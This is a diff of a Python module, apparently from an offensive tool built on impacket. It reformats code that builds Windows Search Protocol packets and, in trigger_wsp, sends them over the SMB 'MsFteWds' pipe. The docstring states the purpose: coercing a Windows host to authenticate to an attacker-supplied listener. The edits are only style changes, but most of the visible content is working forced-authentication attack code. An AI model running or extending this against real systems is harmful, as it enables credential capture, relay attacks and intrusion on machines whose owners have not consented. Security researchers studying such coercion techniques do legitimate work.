@@ -9,7 +9,7 @@ import struct
 import uuid
 from dataclasses import dataclass, field
 from enum import IntEnum
-from typing import Any, List
+from typing import Any
 
 from impacket.smb3 import (
     FILE_READ_DATA,
@@ -44,6 +44,7 @@ class WspMessageType(IntEnum):
 # Helpers
 # =============================================================================
 
+
 def _align_write(buf, alignment):
     while len(buf) % alignment != 0:
         buf.extend(b"\x00")
@@ -56,8 +57,7 @@ def _add_align(buf, data, alignment):
 
 def _checksum(buffer, msg_type):
     total = sum(
-        int.from_bytes(buffer[i:i + 4], "little")
-        for i in range(0, len(buffer), 4)
+        int.from_bytes(buffer[i : i + 4], "little") for i in range(0, len(buffer), 4)
     )
     total ^= XOR_CONST
     total -= msg_type
@@ -68,6 +68,7 @@ def _checksum(buffer, msg_type):
 # Packet structures
 # =============================================================================
 
+
 @dataclass
 class WspMessageHeader:
     _msg: int
@@ -76,8 +77,9 @@ class WspMessageHeader:
     _ulReserved2: int = 0
 
     def to_bytes(self):
-        return struct.pack("<IIII", self._msg, self._status,
-                           self._ulChecksum, self._ulReserved2)
+        return struct.pack(
+            "<IIII", self._msg, self._status, self._ulChecksum, self._ulReserved2
+        )
 
 
 @dataclass
@@ -125,7 +127,7 @@ class CProp:
 @dataclass
 class CPropSet:
     guidPropertySet: uuid.UUID
-    aProps: List[CProp] = field(default_factory=list)
+    aProps: list[CProp] = field(default_factory=list)
 
     def to_bytes(self, buf):
         buf.extend(self.guidPropertySet.bytes_le)
@@ -161,10 +163,15 @@ class CPMConnectIn:
         _add_align(blob2, struct.pack("<I", 1), 8)
         CPropSet(
             DBPROPSET_FSCIFRMWRK_EXT,
-            [CProp(
-                DBPROPID=DBPROP_CI_CATALOG_NAME,
-                vValue=CBaseStorageVariant(vType=0x0008, vValue=VT_BSTR("Windows\\SYSTEMINDEX")),
-            )],
+            [
+                CProp(
+                    DBPROPID=DBPROP_CI_CATALOG_NAME,
+                    vValue=CBaseStorageVariant(
+                        vType=0x0008,
+                        vValue=VT_BSTR("Windows\\SYSTEMINDEX"),
+                    ),
+                )
+            ],
         ).to_bytes(blob2)
 
         _add_align(buf, struct.pack("<I", len(blob2)), 8)
@@ -257,6 +264,7 @@ class CPMDisconnect:
 # WSP coercion trigger
 # =============================================================================
 
+
 def trigger_wsp(smb_client, listener, username="bigpotam"):
     """Execute WSP Connect/Query/Disconnect to coerce authentication.
 
@@ -276,7 +284,10 @@ def trigger_wsp(smb_client, listener, username="bigpotam"):
 
     try:
         file_id = smb_client.createFile(
-            tree_id, "MsFteWds", FILE_READ_DATA, FILE_SHARE_READ,
+            tree_id,
+            "MsFteWds",
+            FILE_READ_DATA,
+            FILE_SHARE_READ,
         )
     except Exception as e:
         err = str(e)
@@ -288,20 +299,35 @@ def trigger_wsp(smb_client, listener, username="bigpotam"):
 
     try:
         smb_client._SMBConnection.ioctl(
-            tree_id, file_id, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL,
-            CPMConnectIn("bigpotam", username).to_bytes(), 0, 40,
+            tree_id,
+            file_id,
+            FSCTL_PIPE_TRANSCEIVE,
+            SMB2_0_IOCTL_IS_FSCTL,
+            CPMConnectIn("bigpotam", username).to_bytes(),
+            0,
+            40,
         )
         log.debug("WSP: Connect sent")
 
         smb_client._SMBConnection.ioctl(
-            tree_id, file_id, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL,
-            CPMCreateQueryIn(listener).to_bytes(), 0, 40,
+            tree_id,
+            file_id,
+            FSCTL_PIPE_TRANSCEIVE,
+            SMB2_0_IOCTL_IS_FSCTL,
+            CPMCreateQueryIn(listener).to_bytes(),
+            0,
+            40,
         )
         log.debug("WSP: Query sent")
 
         smb_client._SMBConnection.ioctl(
-            tree_id, file_id, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL,
-            CPMDisconnect().to_bytes(), 0, 40,
+            tree_id,
+            file_id,
+            FSCTL_PIPE_TRANSCEIVE,
+            SMB2_0_IOCTL_IS_FSCTL,
+            CPMDisconnect().to_bytes(),
+            0,
+            40,
         )
         log.debug("WSP: Disconnect sent")
 
